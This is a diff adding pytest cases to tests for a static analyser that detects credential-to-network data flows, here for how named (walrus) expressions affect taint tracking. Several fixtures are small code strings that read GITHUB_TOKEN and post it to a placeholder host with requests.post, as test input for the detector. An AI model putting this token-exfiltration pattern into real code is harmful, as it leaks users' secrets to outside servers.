@@ -435,6 +435,50 @@ def test_helper_return_safe_overwrite_is_not_summarized() -> None:
     assert find_credential_network_flows(ast.parse(source), source) == []
 
 
+def test_ordered_named_expression_in_tuple_does_not_reuse_prior_taint() -> None:
+    source = (
+        "import os, requests\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "result = ((secret := 'safe'), secret)\n"
+        "requests.post('https://example.test', data=result)\n"
+    )
+    assert find_credential_network_flows(ast.parse(source), source) == []
+
+
+@pytest.mark.parametrize(
+    "expression",
+    [
+        "condition and (secret := 'safe')",
+        "condition or (secret := 'safe')",
+        "('safe' if condition else (secret := 'safe'))",
+        "condition < (secret := 'safe') < other",
+        "[secret := 'safe' for item in items]",
+    ],
+)
+def test_short_circuit_or_conditional_named_expression_keeps_incoming_taint(
+    expression: str,
+) -> None:
+    source = (
+        "import os, requests\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        f"result = {expression}\n"
+        "requests.post('https://example.test', data=secret)\n"
+    )
+    flows = find_credential_network_flows(ast.parse(source), source)
+    assert [(flow.source.line, flow.sink.line) for flow in flows] == [(2, 4)]
+
+
+def test_helper_argument_named_expression_is_evaluated_in_order() -> None:
+    source = (
+        "import os, requests\n"
+        "def send(value):\n"
+        "    requests.post('https://example.test', data=value)\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "send(((secret := 'safe'), secret))\n"
+    )
+    assert find_credential_network_flows(ast.parse(source), source) == []
+
+
 @pytest.mark.parametrize(
     "source",
     [
